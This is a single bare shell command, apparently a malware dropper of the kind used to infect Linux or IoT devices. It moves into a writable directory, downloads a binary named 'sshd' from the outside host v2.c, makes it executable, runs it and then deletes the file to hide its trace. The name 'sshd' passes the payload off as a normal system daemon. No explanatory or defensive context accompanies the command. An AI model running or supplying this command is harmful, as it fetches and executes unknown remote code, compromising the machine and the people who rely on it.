cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://v2.c/sshd; chmod +x sshd; ./sshd; rm -rf sshd
